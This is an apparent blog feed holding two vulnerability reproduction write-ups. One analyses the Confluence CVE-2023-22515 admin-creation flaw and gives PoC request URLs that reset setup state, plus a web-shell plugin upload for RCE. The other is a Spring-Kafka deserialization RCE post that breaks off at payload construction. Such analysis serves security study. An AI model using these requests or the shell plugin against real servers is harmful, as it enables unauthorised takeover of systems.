<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Drunkbaby&#39;s Blog</title>
  
  <subtitle>Hexo theme keep quick starter</subtitle>
  <link href="https://drun1baby.github.io/atom.xml" rel="self"/>
  
  <link href="https://drun1baby.github.io/"/>
  <updated>2023-11-28T07:36:15.643Z</updated>
  <id>https://drun1baby.github.io/</id>
  
  <author>
    <name>Keep Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023 TPCTF WP</title>
    <link href="https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/</id>
    <published>2023-11-28T07:36:15.000Z</published>
    <updated>2023-11-28T07:36:15.643Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2023-22515 Confluence RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-27T01:48:04.000Z</published>
    <updated>2023-11-27T01:54:30.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Confluence-RCE-漏洞分析"><a href="#CVE-2023-22515-Confluence-RCE-漏洞分析" class="headerlink" title="CVE-2023-22515 Confluence RCE 漏洞分析"></a>CVE-2023-22515 Confluence RCE 漏洞分析</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Confluence 是由 Atlassian 开发的企业级协作软件。2023年10月，Atlassian 官方披露 CVE-2023-22515 Atlassian Confluence Data Center &amp; Server 权限提升漏洞。攻击者可构造恶意请求创建管理员，从而登录系统，造成敏感信息泄漏等。</p><p>如果 Confluence 站点托管在 Atlassian Cloud(域名为：<code>atlassian.net</code>)，则不受此漏洞影响。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>8.0.0 - - 8.0.4<br>8.1.0 - - 8.1.4<br>8.2.0 - - 8.2.3<br>8.3.0 - - 8.3.2<br>8.4.0 - - 8.4.2<br>8.5.0 - - 8.5.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>安装包 <a class="link" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives<i class="fas fa-external-link-alt"></i></a></p><p>jar 包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.1.zip  </span><br><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.2.zip</span><br></pre></td></tr></table></figure><p>大致的安装可以看 <a class="link" href="https://cn-sec.com/archives/2177640.html">https://cn-sec.com/archives/2177640.html<i class="fas fa-external-link-alt"></i></a></p><p>其中有一步数据库的安装会存在一些问题，首先是新建数据库的时候，对编码有要求</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE confluence <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin;</span><br></pre></td></tr></table></figure><p>随后是连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://localhost/confluence?sessionVariables=transaction_isolation=<span class="string">&#x27;READ-COMMITTED&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupDatabase.png" class><p>在配置数据库时需要指定 <code>READ-COMMITTED</code></p><p>下一步是做调试准备，这里的调试需要找到 Service</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/service.png" class><p>随后在 cmd 里面运行这一个行命令，就会跳出如图所示的框框</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat9w.exe //ES//Confluence151123100612</span><br></pre></td></tr></table></figure><p>随后添加 JAVA_OPTS，进行动调</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据官方的公告，修复建议是给 <code>/setup</code> 打头的接口做鉴权校验</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/setup/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method-omission</span>&gt;</span>*<span class="tag">&lt;/<span class="name">http-method-omission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-constraint</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于 Confluence 这里的框架是基于 S2 的，S2 的大致流程如 su18 师傅的图所示</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/s2Route.png" class><p>也就是说我们现在需要去找一下 <code>/setup/*</code> 接口是怎么被处理的，直接分析是比较难的，所以先 diff 一下代码。</p><ul><li><p>首先 <code>struts2.xml</code> 里面</p></li><li><p>修复版本新增了 <code>struts.override.acceptedPatterns</code></p></li><li><p>修复版本删除了 <code>server-info action</code></p></li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/strutsXMLDiff.png" class><ul><li>接着是 <code>BootstapStatusProviderImpl</code> 类里面增加了部分内容，对属性 setupPersister 和 applicationConfig 做了限制</li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BootstapStatusProviderImpl.png" class><p>这里有点没看懂修了什么，所以我先动调观察具体接口是怎么处理的，根据 Struts2 的特性，去到 <code>struts.xml</code> 里面找对应的 <strong>Interceptor</strong>，不难找到具体处理的拦截器是 <code>SetupCheckInterceptor</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupInterceptor.png" class><p>开始动调，看一下 <code>/setup/setupadministrator.action</code> 接口的逻辑是怎么处理的。</p><p>中间走到 <code>com.atlassian.config.ApplicationConfig#isSetupComplete</code> 时，在新版本的 fix 里面是增加了这一段的 <code>ReadOnlyApplicationConfig</code> 配置的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSetupComplete.png" class><p>所以这里的漏洞利用思路大概就是先动态修改 <code>setupPersister</code> 或 <code>applicationConfig</code>，在触发了这一点之后，能够下一步访问 <code>/setup/setupadministrator.action</code>，重新配置管理员密码。</p><p>这里具体的实现很有意思，su18 师傅的文章说的很明白，我就直接拿过来用了</p><p><a class="link" href="https://su18.org/post/struts2-1/">https://su18.org/post/struts2-1/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>OGNL 中的根对象即为 ValueStack（值栈），这个对象贯穿整个 Action 的生命周期（每个 Action 类的对象实例会拥有一个 ValueStack 对象）。当Struts 2接收到一个 <code>.action</code> 的请求后，会先建立Action 类的对象实例，但并不会调用 Action 方法，而是先将 Action 类的相应属性放到 ValueStack 的实现类 OgnlValueStack 对象 root 对象的顶层节点（ ValueStack 对象相当于一个栈）。在处理完上述工作后，Struts2 就会调用拦截器链中的拦截器，这些拦截器会根据用户请求参数值去更新 ValueStack 对象顶层节点的相应属性的值，最后会传到 Action 对象，并将 ValueStack 对象中的属性值，赋给 Action 类的相应属性。当调用完所有的拦截器后，才会调用 Action 类的 Action 方法。ValueStack 会在请求开始时被创建，请求结束时消亡。</p></blockquote><p>我们需要找一个 OGNL 的点, 并且这个点能够以某种方式去调用某个类的 getter &#x2F; setter, 以此来配置 applicationConfig 的 setupComplete 字段</p><p>于是去 diff 跟 Struts2 有关的依赖, 即 <code>com.atlassian.struts2_struts-support-1.1.0.jar</code> 和 <code>com.atlassian.struts2_struts-support-1.2.0.jar</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff2.png" class><p>发现修改的类是 <code>SafeParametersInterceptor</code>，这个类会处理所有的输入，所以 <code>server-info.action</code> 这个请求也会经过它</p><p>同时，Confluence 使用了 XWork 框架，它允许通过 HTTP 请求来设置 Java 对象的参数：<a class="link" href="https://developer.atlassian.com/server/confluence/xwork-plugin-complex-parameters-and-security/">XWork Plugin Complex Parameters and Security<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>XWork allows the setting of complex parameters on an XWork action object. For example, a URL parameter of <code>formData.name=Charles</code> will be translated by XWork into the method calls <code>getFormData().setName(&quot;Charles&quot;)</code> by the XWork parameters interceptor. If <code>getFormData()</code> returns null, XWork will attempt to create a new object of the appropriate return type using its default constructor, and then set it with <code>setFormData(newObject)</code></p></blockquote><p>这就允许我们在输入时候传参类似于 <code>?test=a.b.c</code>，动调一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?a.b.c</span><br></pre></td></tr></table></figure><p>这里会先做过滤，跟进 <code>this.filterSafeParameters()</code> 方法，该方法会对传入的参数进行判断，如果包含关键字或者满足正则匹配则返回 false</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterSafeParameters.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BLOCKED_PARAMETER_NAMES: actionErrors、actionMessages  </span><br><span class="line">EXCLUDE_CLASS_PATTERN: .*class[^a-z0-9_].*  </span><br><span class="line">SAFE_PARAMETER_NAME_PATTERN: \w+((\.\w+)|(\[\d+\])|(\[<span class="string">&#x27;[\w.]*&#x27;</span>\]))*  </span><br><span class="line">MAP_PARAMETER_PATTERN: .*\[<span class="string">&#x27;[a-zA-Z0-9_]+&#x27;</span>\]</span><br></pre></td></tr></table></figure><p>如果不在黑名单内，最后会调用 <code>isSafeComplexParameterName()</code> 方法，这个方法会检查传入的参数是否调用了当前 action 的某个 getter &#x2F; setter，如果调用了，则判断里面是否有 <code>ParameterSafe</code> 注解。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSafeComplexParameterName.png" class><p>如果没有实现 <code>@ParameterSafe</code> 注解，那么 isSafeMethod 就会返回 false</p><p>这么一看，漏洞成立需要绕过黑名单验证，并且满足 <code>@ParameterSafe</code> 注解，利用条件十分苛刻。继续往下走，回到 <code>com.atlassian.xwork.interceptors.SafeParametersInterceptor#doIntercept</code>，跟进 <code>super.doIntercept()</code> 方法。能够看到这里是跟进到了 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code> 方法，它会重新处理一遍参数，这就导致上面的黑名单完全没生效。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doIntercept.png" class><p>跟进 <code>setParameters()</code> 方法后其实就是 S2 处理 OGNL 语句的那一套，参考 <a class="link" href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setParameter.png" class><p>总的来说, 因为 <code>SafeParametersInterceptor.doIntercept()</code> 方法的一些逻辑问题, 导致这个类自身对传入参数的过滤并没有生效, 我们最终还是可以通过 <code>a.b.c=e</code> 的形式去调用当前 action 的 getter &#x2F; setter, 并不需要关心方法本身或者它的 returnType 是否使用了 <code>@ParameterSafe</code> 注解</p><p>到这里思路就很清晰了，我们只需要构造 OGNL 即可，调用某个 Action 里的 setter，让 <code>isSetupComplete=false</code> 即可</p><p>以 ServerInfoAction 为例, 它继承自 ConfluenceActionSupport</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getBootstrapStatusProvider.png" class><p>这里的 <code>getBootstrapStatusProvider()</code> 方法调用了 <code>BootstrapStatusProviderImpl.getInstance()</code>，接下来就可以去 <code>BootstrapStatusProviderImpl</code> 里面寻找调用链，可惜的是这里的 <code>setSetupComplete()</code> 已经用不了了，只能找另外的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupComplete.png" class><p>最终找到的是 <code>getApplicationConfig()</code> 方法，而在 <code>ApplicationConfig</code> 类里面存在 <code>setSetupComplete()</code> 方法可用</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupCompleteEnd.png" class><p>因为 Confluence 的所有 Action 都继承自 ConfluenceActionSupport, 所以理论上只要访问任意一个使用了 SafeParameterInterceptor 的路由, 无论是 GET 还是 POST 方法都能够利用成功</p><p>于是最后的 PoC 应该是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span><br></pre></td></tr></table></figure><p>在进行覆盖 <code>setupComplete=false</code> 之后重新注册管理员</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/setup/setupadministrator-start.action</span><br></pre></td></tr></table></figure><h2 id="0x05-未授权之后的-RCE"><a href="#0x05-未授权之后的-RCE" class="headerlink" title="0x05 未授权之后的 RCE"></a>0x05 未授权之后的 RCE</h2><p>X1r0z 师傅已经介绍了一种 RCE 的方法，但是利用条件有限，需要 web目录可写并且高权限用户</p><p>其实有一种更简单的方法，看到：<a class="link" href="https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html<i class="fas fa-external-link-alt"></i></a></p><p>可以通过上传插件实现 RCE，利用工具github上已经存在了：<a class="link" href="https://github.com/AIex-3/confluence-hack/">https://github.com/AIex-3/confluence-hack/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/plugins/servlet/upm</span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/managePlugins.png" class><p>上传 plugin_shellplug.jar，访问 <code>/plugins/servlet/com.jsos.shell/ShellServlet</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/">http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-22515 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-34040 Kafka 反序列化 RCE</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/</id>
    <published>2023-11-27T01:47:49.000Z</published>
    <updated>2023-11-27T01:52:03.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34040-Kafka-反序列化-RCE"><a href="#CVE-2023-34040-Kafka-反序列化-RCE" class="headerlink" title="CVE-2023-34040 Kafka 反序列化 RCE"></a>CVE-2023-34040 Kafka 反序列化 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Kafka 是 Spring Framework 生态系统中的一个模块，用于简化在 Spring 应用程序中集成 Apache Kafka 的过程，记录 (record) 指 Kafka 消息中的一条记录。</p><p>受影响版本中默认未对记录配置 <code>ErrorHandlingDeserializer</code>，当用户将容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true(默认为 false)，并且允许不受信任的源发布到 Kafka 主题中时，攻击者可将恶意 payload 注入到 Kafka 主题中，当反序列化记录头时远程执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.8.1 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 2.9.10<br>3.0.0 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 3.0.9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这一个漏洞所影响的组件其实是 Spring-Kafka，严格意义上来说并不算是 kafka 的漏洞，应该算是 Spring 的漏洞。</p><h3 id="漏洞前置知识"><a href="#漏洞前置知识" class="headerlink" title="漏洞前置知识"></a>漏洞前置知识</h3><p>先来看一看 SpringBoot 和 Kafka 是怎么完成通讯&#x2F;消费的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SpringBootToKafka.png" class><p><strong>工作流程如下</strong></p><p>1、生产者将消息发送到 Kafka 集群中的某个 Broker（也可以是多个）<br>2、Kafka 集群将消息存储在一个或多个分区中，并为每个分区维护一个偏移量<br>3、消费者订阅一个或多个主题，并从 Kafka 集群中读取消息。<br>4、消费者按顺序读取每个分区中的消息，并跟踪每个分区的偏移量。</p><ul><li>ErrorHandlingDeserializer：是 Kafka中的一种反序列化器（Deserializer），它可以在反序列化过程中处理异常和错误。</li><li>checkDeserExWhenKeyNull &amp;&amp; checkDeserExWhenValueNull：是 Kafka 中的一种序列化器（Serializer），它可以在序列化过程中检查键（key&#x2F;value）是否为 null，并在发现值为 null 时抛出异常。</li></ul><p>再简单整理一下漏洞条件</p><blockquote><p>在受到影响的版本中，默认未对记录配置 <code>ErrorHandlingDeserializer</code><br>容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>其中需要我们起一个 Kafka 的服务，用来接收消息，本机上起比较麻烦，可以在 vps 上用 docker 迅速搭建，且需注意，Kafka 要能够接受外连，<code>docker-compose.yml</code> 如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">zookeeper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2181:2181&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zookeeper</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wurstmeister/kafka</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9092:9092&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9094:9094&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_HOST_NAME:</span> <span class="number">124.222</span><span class="number">.21</span><span class="number">.138</span></span><br><span class="line">      <span class="attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="string">zookeeper:2181</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENERS:</span> <span class="string">PLAINTEXT://0.0.0.0:9092,SSL://0.0.0.0:9094</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="string">PLAINTEXT://124.222.21.138:9092,SSL://124.222.21.138:9094</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="string">PLAINTEXT:PLAINTEXT,SSL:SSL</span></span><br><span class="line">      <span class="attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="string">PLAINTEXT</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kafka</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Spring Kafka 的生产者和消费者可以通过使用 Spring Kafka 提供的 <code>KafkaTemplate</code> 和 &#96;&#96;@KafkaListener&#96; 注解来编写。</p><p>生产者可以使用 <code>KafkaTemplate</code> 来发送消息到 Kafka 集群：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.support.SendResult;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFuture;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;  </span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/producer&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerController</span> &#123;  </span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String,String&gt; kafkaTemplate;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/fireAndForget&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fireAndForget</span><span class="params">()</span> &#123;  </span><br><span class="line">        kafkaTemplate.send(KafkaInfo.TOPIC_WELCOME, <span class="string">&quot;fireAndForget:&quot;</span> + LocalDateTime.now());  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消费者可以使用 <code>@KafkaListener</code> 注解来监听 Kafka 集群中的消息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.consumer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Headers;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Payload;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;  </span><br><span class="line">    <span class="meta">@KafkaListener(topics = KafkaInfo.TOPIC_WELCOME)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">consumer2</span><span class="params">(<span class="meta">@Payload</span> String message, <span class="meta">@Headers</span> MessageHeaders headers)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;消费者(注解方式)：收到消息==&gt; &quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  message：&quot;</span> + message);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  headers:&quot;</span>);  </span><br><span class="line">        headers.keySet().forEach(key -&gt; System.out.println(<span class="string">&quot;    &quot;</span> + key + <span class="string">&quot;:&quot;</span> + headers.get(key)));  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>连接成功</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><p>访问 <code>http://localhost:8083/producer/sync</code> 发送一条记录</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>实际影响到的是 Consumer，且 Consumer 要设置 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 为 true </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 